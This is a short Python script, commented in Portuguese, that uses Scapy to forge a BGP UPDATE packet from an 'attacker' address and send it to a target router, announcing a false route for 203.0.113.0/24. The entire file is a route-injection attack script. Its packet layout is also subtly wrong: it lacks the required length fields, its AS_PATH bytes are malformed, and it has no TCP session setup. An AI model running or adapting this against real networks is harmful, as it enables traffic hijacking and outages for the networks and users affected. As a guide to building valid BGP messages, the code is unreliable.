from scapy.all import *
from scapy.layers.inet import IP, TCP
from scapy.contrib.bgp import BGPHeader, BGPUpdate, BGPPathAttr

# Configurações do BGP
src_ip = "10.0.0.1"  # IP de origem do atacante
dst_ip = "10.0.0.2"  # IP do roteador BGP alvo
src_port = 179        # Porta de origem BGP
bgp_as_path = b'\x40\x02\x00\x02\xfd\xe9'  # AS_PATH (ASN 65001)
bgp_next_hop = b'\x40\x03\x04\x0a\x00\x00\x01'  # NEXT_HOP (10.0.0.1)

# NLRI (prefixo)
nlri = b'\x18\xcb\x00\x71'  # Prefixo 203.0.113.0/24

# Construção do pacote BGP Update
bgp_update = BGPHeader() / Raw(b'\x02' + bgp_as_path + bgp_next_hop + nlri)

# Construção do pacote TCP/IP
packet = IP(src=src_ip, dst=dst_ip) / TCP(sport=src_port, dport=179, flags="PA") / bgp_update

# Envio do pacote manipulado
send(packet, verbose=1)

print("Pacote BGP com rota falsa enviado.")
